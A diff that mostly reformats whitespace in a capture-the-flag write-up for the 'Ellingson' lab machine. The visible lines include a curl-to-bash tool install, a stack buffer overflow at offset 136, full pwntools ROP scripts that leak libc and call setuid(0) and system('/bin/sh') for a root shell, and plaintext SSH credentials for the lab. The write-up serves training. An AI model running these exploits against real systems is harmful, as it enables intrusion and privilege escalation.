@@ -9,8 +9,8 @@
 
 | PORT | SERVICE |
 | :--- | :------ |
-| 22   | SSH     |
-| 80   | HTTP    |
+| 22 | SSH |
+| 80 | HTTP |
 
 
 
@@ -101,11 +101,11 @@ Inside of `/home/hal/.ssh`, we can find an `id_rsa` key:
 ```
 hal@ellingson:~$ ls -la .ssh
 total 20
-drwx------ 2 hal hal 4096 Jul 16  2021 .
-drwxrwx--- 5 hal hal 4096 Jul 16  2021 ..
--rw-r--r-- 1 hal hal 1145 Mar 10  2019 authorized_keys
--rw------- 1 hal hal 1766 Mar  9  2019 id_rsa
--rw-r--r-- 1 hal hal  395 Mar  9  2019 id_rsa.pub
+drwx------ 2 hal hal 4096 Jul 16 2021 .
+drwxrwx--- 5 hal hal 4096 Jul 16 2021 ..
+-rw-r--r-- 1 hal hal 1145 Mar 10 2019 authorized_keys
+-rw------- 1 hal hal 1766 Mar 9 2019 id_rsa
+-rw-r--r-- 1 hal hal 395 Mar 9 2019 id_rsa.pub
 ```
 
 Let's get it on our machine and try logging into ssh:
@@ -409,7 +409,7 @@ The tankers have stopped capsizing
 > 4
 ```
 
-Nothing weird on here, the weird stuff comes on the `Enter access password`, if we analyze the strings, we can notice that `strcpy`Â andÂ `strcat`Â appear in the strings. These functions doÂ **not check buffer sizes**, making them prime candidates for buffer overflows. Let's try to check if the buffer overflow exists:
+Nothing weird on here, the weird stuff comes on the `Enter access password`, if we analyze the strings, we can notice that `strcpy` and`strcat` appear in the strings. These functions do **not check buffer sizes**, making them prime candidates for buffer overflows. Let's try to check if the buffer overflow exists:
 
 ```bash
 margo@ellingson:~$ /usr/bin/garbage
@@ -450,7 +450,7 @@ bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
 Now, let's start, first, let's create a pattern:
 
 ```
-gefâž¤  pattern create
+gefâž¤ pattern create
 [+] Generating a pattern of 1024 bytes (n=8)
 aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf
 [+] Saved as '$_gef0'
@@ -462,23 +462,23 @@ Now, let's proceed:
 ```
 [ Legend: Modified register | Code | Heap | Stack | String ]
 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ registers â”€â”€â”€â”€
-$rax   : 0x0               
-$rbx   : 0x00007fffffffde88  â†’  "faaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaacla[...]"
-$rcx   : 0x00007ffff7eb4210  â†’  0x5877fffff0003d48 ("H="?)
-$rdx   : 0x0               
-$rsp   : 0x00007fffffffdd58  â†’  "raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa[...]"
-$rbp   : 0x6161616161616171 ("qaaaaaaa"?)
-$rsi   : 0x0000000000406d60  â†’  "access denied.\nssword: "
-$rdi   : 0x00007ffff7f99710  â†’  0x0000000000000000
-$rip   : 0x0000000000401618  â†’  <auth+0105> ret 
-$r8    : 0x00007fffffffe090  â†’  "uaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafba[...]"
-$r9    : 0x00007ffff7f30a80  â†’   movaps xmm1, XMMWORD PTR [rsi+0x10]
-$r10   : 0x3               
-$r11   : 0x202             
-$r12   : 0x0               
-$r13   : 0x00007fffffffde98  â†’  "haaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacna[...]"
-$r14   : 0x00007ffff7ffd000  â†’  0x00007ffff7ffe2e0  â†’  0x0000000000000000
-$r15   : 0x0               
+$rax : 0x0 
+$rbx : 0x00007fffffffde88 â†’ "faaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaacla[...]"
+$rcx : 0x00007ffff7eb4210 â†’ 0x5877fffff0003d48 ("H="?)
+$rdx : 0x0 
+$rsp : 0x00007fffffffdd58 â†’ "raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa[...]"
+$rbp : 0x6161616161616171 ("qaaaaaaa"?)
+$rsi : 0x0000000000406d60 â†’ "access denied.\nssword: "
+$rdi : 0x00007ffff7f99710 â†’ 0x0000000000000000
+$rip : 0x0000000000401618 â†’ <auth+0105> ret 
+$r8 : 0x00007fffffffe090 â†’ "uaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafba[...]"
+$r9 : 0x00007ffff7f30a80 â†’ movaps xmm1, XMMWORD PTR [rsi+0x10]
+$r10 : 0x3 
+$r11 : 0x202 
+$r12 : 0x0 
+$r13 : 0x00007fffffffde98 â†’ "haaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacna[...]"
+$r14 : 0x00007ffff7ffd000 â†’ 0x00007ffff7ffe2e0 â†’ 0x0000000000000000
+$r15 : 0x0 
 $eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
 $cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ stack â”€â”€â”€â”€
@@ -491,10 +491,10 @@ $cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
 0x00007fffffffdd88â”‚+0x0030: "xaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabea[...]"
 0x00007fffffffdd90â”‚+0x0038: "yaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfa[...]"
 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ code:x86:64 â”€â”€â”€â”€
-     0x40160d <auth+00fa>      call   0x401050 <puts@plt>
-     0x401612 <auth+00ff>      mov    eax, 0x0
-     0x401617 <auth+0104>      leave  
- â†’   0x401618 <auth+0105>      ret    
+ 0x40160d <auth+00fa> call 0x401050 <puts@plt>
+ 0x401612 <auth+00ff> mov eax, 0x0
+ 0x401617 <auth+0104> leave 
+ â†’ 0x401618 <auth+0105> ret 
 [!] Cannot disassemble from $PC
 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ threads â”€â”€â”€â”€
 [#0] Id 1, Name: "garbage", stopped 0x401618 in auth (), reason: SIGSEGV
@@ -507,7 +507,7 @@ gefâž¤
 We can get the offset by using:
 
 ```bash
-gefâž¤  pattern offset raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa
+gefâž¤ pattern offset raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa
 [+] Searching for '6178616161616161617761616161616161766161616161616175616161616161617461616161616161736161616161616172'/'7261616161616161736161616161616174616161616161617561616161616161766161616161616177616161616161617861' with period=8
 [+] Found at offset 136 (big-endian search)
 ```
@@ -519,30 +519,30 @@ Offset is `136` bytes, let's save this info for now, we can create a simple pyth
 from pwn import *
 
 def leak(p, elf, libc, rop):
-    POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
-    LIBC_START_MAIN = elf.symbols['__libc_start_main']
-    PUTS = elf.plt['puts']
-    MAIN = elf.symbols['main']
-    
-    log.info("puts@plt: " + hex(PUTS))
-    log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
-    log.info("pop rdi gadget: " + hex(POP_RDI))
-    
-    payload = b"A" * 136
-    payload += p64(POP_RDI)
-    payload += p64(LIBC_START_MAIN)
-    payload += p64(PUTS)
-    payload += p64(MAIN)
+ POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
+ LIBC_START_MAIN = elf.symbols['__libc_start_main']
+ PUTS = elf.plt['puts']
+ MAIN = elf.symbols['main']
+ 
+ log.info("puts@plt: " + hex(PUTS))
+ log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
+ log.info("pop rdi gadget: " + hex(POP_RDI))
+ 
+ payload = b"A" * 136
+ payload += p64(POP_RDI)
+ payload += p64(LIBC_START_MAIN)
+ payload += p64(PUTS)
+ payload += p64(MAIN)
 
-    p.recvuntil(b'password:')
-    p.sendline(payload)
-    p.recvline()
-    p.recvline()
-    leak = p.recvline().strip()
-    leak = u64(leak.ljust(8, b"\x00"))  # Pad to 8 bytes and unpack
+ p.recvuntil(b'password:')
+ p.sendline(payload)
+ p.recvline()
+ p.recvline()
+ leak = p.recvline().strip()
+ leak = u64(leak.ljust(8, b"\x00")) # Pad to 8 bytes and unpack
 
-    log.success("Leaked __libc_start_main: " + hex(leak))
-    return leak
+ log.success("Leaked __libc_start_main: " + hex(leak))
+ return leak
 
 # Connect to target
 r = ssh(host='10.10.10.139', user='margo', password='iamgod$08')
@@ -569,28 +569,28 @@ If we use the script, we get this:
 python3 libc_base.py
 [+] Connecting to 10.10.10.139 on port 22: Done
 [*] margo@10.10.10.139:
-    Distro    Ubuntu 18.04
-    OS:       linux
-    Arch:     amd64
-    Version:  4.15.0
-    ASLR:     Enabled
-    SHSTK:    Disabled
-    IBT:      Disabled
+ Distro Ubuntu 18.04
+ OS: linux
+ Arch: amd64
+ Version: 4.15.0
+ ASLR: Enabled
+ SHSTK: Disabled
+ IBT: Disabled
 [+] Starting remote process None on 10.10.10.139: pid 89708
 [!] ASLR is disabled for '/usr/bin/garbage'!
 [*] '/home/samsepiol/Downloads/garbage'
-    Arch:       amd64-64-little
-    RELRO:      Partial RELRO
-    Stack:      No canary found
-    NX:         NX enabled
-    PIE:        No PIE (0x400000)
-    Stripped:   No
+ Arch: amd64-64-little
+ RELRO: Partial RELRO
+ Stack: No canary found
+ NX: NX enabled
+ PIE: No PIE (0x400000)
+ Stripped: No
 [*] '/home/samsepiol/Downloads/libc.so.6'
-    Arch:       amd64-64-little
-    RELRO:      Partial RELRO
-    Stack:      Canary found
-    NX:         NX enabled
-    PIE:        PIE enabled
+ Arch: amd64-64-little
+ RELRO: Partial RELRO
+ Stack: Canary found
+ NX: NX enabled
+ PIE: PIE enabled
 [*] Loaded 14 cached gadgets for './garbage'
 [*] puts@plt: 0x401050
 [*] __libc_start_main: 0x403ff0
@@ -609,49 +609,49 @@ There we go, we got the base address, we can construct another script which give
 from pwn import *
 
 def leak(p, elf, libc, rop):
-    POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
-    LIBC_START_MAIN = elf.symbols['__libc_start_main']
-    PUTS = elf.plt['puts']
-    MAIN = elf.symbols['main']
-    
-    log.info("puts@plt: " + hex(PUTS))
-    log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
-    log.info("pop rdi gadget: " + hex(POP_RDI))
-    
-    payload = b"A" * 136  
-    payload += p64(POP_RDI)
-    payload += p64(LIBC_START_MAIN)
-    payload += p64(PUTS)
-    payload += p64(MAIN)
+ POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
+ LIBC_START_MAIN = elf.symbols['__libc_start_main']
+ PUTS = elf.plt['puts']
+ MAIN = elf.symbols['main']
+ 
+ log.info("puts@plt: " + hex(PUTS))
+ log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
+ log.info("pop rdi gadget: " + hex(POP_RDI))
+ 
+ payload = b"A" * 136 
+ payload += p64(POP_RDI)
+ payload += p64(LIBC_START_MAIN)
+ payload += p64(PUTS)
+ payload += p64(MAIN)
 
-    p.recvuntil(b'password:') 
-    p.sendline(payload)
-    p.recvline()
-    p.recvline()
-    leak = p.recvline().strip()
-    leak = u64(leak.ljust(8, b"\x00")) 
+ p.recvuntil(b'password:') 
+ p.sendline(payload)
+ p.recvline()
+ p.recvline()
+ leak = p.recvline().strip()
+ leak = u64(leak.ljust(8, b"\x00")) 
 
-    log.success("Leaked __libc_start_main: " + hex(leak))
-    return leak
+ log.success("Leaked __libc_start_main: " + hex(leak))
+ return leak
 
 def shell(p, elf, libc, rop):
-    RET = rop.find_gadget(['ret'])[0]
-    POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
-    BIN_SH = next(libc.search(b"/bin/sh")) 
-    SYSTEM = libc.sym["system"]
+ RET = rop.find_gadget(['ret'])[0]
+ POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
+ BIN_SH = next(libc.search(b"/bin/sh")) 
+ SYSTEM = libc.sym["system"]
 
-    log.success("/bin/sh: " + hex(BIN_SH))
-    log.success("system: " + hex(SYSTEM))
+ log.success("/bin/sh: " + hex(BIN_SH))
+ log.success("system: " + hex(SYSTEM))
 
-    payload = b"A" * 136  
-    payload += p64(RET)
-    payload += p64(POP_RDI)
-    payload += p64(BIN_SH)
-    payload += p64(SYSTEM)
+ payload = b"A" * 136 
+ payload += p64(RET)
+ payload += p64(POP_RDI)
+ payload += p64(BIN_SH)
+ payload += p64(SYSTEM)
 
-    p.recvuntil(b'password:')  
-    p.sendline(payload)
-    p.interactive()
+ p.recvuntil(b'password:') 
+ p.sendline(payload)
+ p.interactive()
 
 # Rest of the script remains the same
 r = ssh(host='10.10.10.139', user='margo', password='iamgod$08')
@@ -677,63 +677,63 @@ But the thing is we are still margo, in order to get a shell as root, we need to
 from pwn import *
 
 def leak(p, elf, libc, rop):
-    POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
-    LIBC_START_MAIN = elf.symbols['__libc_start_main']
-    PUTS = elf.plt['puts']
-    MAIN = elf.symbols['main']
-    
-    log.info("puts@plt: " + hex(PUTS))
-    log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
-    log.info("pop rdi gadget: " + hex(POP_RDI))
-    
-    payload = b"A" * 136  # Changed to bytes
-    payload += p64(POP_RDI)
-    payload += p64(LIBC_START_MAIN)
-    payload += p64(PUTS)
-    payload += p64(MAIN)
+ POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
+ LIBC_START_MAIN = elf.symbols['__libc_start_main']
+ PUTS = elf.plt['puts']
+ MAIN = elf.symbols['main']
+ 
+ log.info("puts@plt: " + hex(PUTS))
+ log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
+ log.info("pop rdi gadget: " + hex(POP_RDI))
+ 
+ payload = b"A" * 136 # Changed to bytes
+ payload += p64(POP_RDI)
+ payload += p64(LIBC_START_MAIN)
+ payload += p64(PUTS)
+ payload += p64(MAIN)
 
-    p.recvuntil(b'password:')  # Changed to bytes
-    p.sendline(payload)
-    p.recvline()
-    p.recvline()
-    leak = p.recvline().strip()
-    leak = u64(leak.ljust(8, b"\x00"))  # Changed to bytes
+ p.recvuntil(b'password:') # Changed to bytes
+ p.sendline(payload)
+ p.recvline()
+ p.recvline()
+ leak = p.recvline().strip()
+ leak = u64(leak.ljust(8, b"\x00")) # Changed to bytes
 
-    log.success("Leaked __libc_start_main: " + hex(leak))
-    return leak
+ log.success("Leaked __libc_start_main: " + hex(leak))
+ return leak
 
 def suid(p, elf, libc, rop):
-    POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
-    SUID = libc.sym['setuid']
-    MAIN = elf.symbols['main']
+ POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
+ SUID = libc.sym['setuid']
+ MAIN = elf.symbols['main']
 
-    payload = b"A" * 136  # Changed to bytes
-    payload += p64(POP_RDI)
-    payload += p64(0)
-    payload += p64(SUID)
-    payload += p64(MAIN)
-    
-    p.recvuntil(b'password:')  # Changed to bytes
-    p.sendline(payload)
+ payload = b"A" * 136 # Changed to bytes
+ payload += p64(POP_RDI)
+ payload += p64(0)
+ payload += p64(SUID)
+ payload += p64(MAIN)
+ 
+ p.recvuntil(b'password:') # Changed to bytes
+ p.sendline(payload)
 
 def shell(p, elf, libc, rop):
-    RET = rop.find_gadget(['ret'])[0]
-    POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
-    BIN_SH = next(libc.search(b"/bin/sh"))  # Changed to bytes
-    SYSTEM = libc.sym["system"]
+ RET = rop.find_gadget(['ret'])[0]
+ POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
+ BIN_SH = next(libc.search(b"/bin/sh")) # Changed to bytes
+ SYSTEM = libc.sym["system"]
 
-    log.success("/bin/sh: " + hex(BIN_SH))
-    log.success("system: " + hex(SYSTEM))
+ log.success("/bin/sh: " + hex(BIN_SH))
+ log.success("system: " + hex(SYSTEM))
 
-    payload = b"A" * 136  # Changed to bytes
-    payload += p64(RET)
-    payload += p64(POP_RDI)
-    payload += p64(BIN_SH)
-    payload += p64(SYSTEM)
+ payload = b"A" * 136 # Changed to bytes
+ payload += p64(RET)
+ payload += p64(POP_RDI)
+ payload += p64(BIN_SH)
+ payload += p64(SYSTEM)
 
-    p.recvuntil(b'password:')  # Changed to bytes
-    p.sendline(payload)
-    p.interactive()
+ p.recvuntil(b'password:') # Changed to bytes
+ p.sendline(payload)
+ p.interactive()
 
 # Connect to target
 r = ssh(host='10.10.10.139', user='margo', password='iamgod$08')
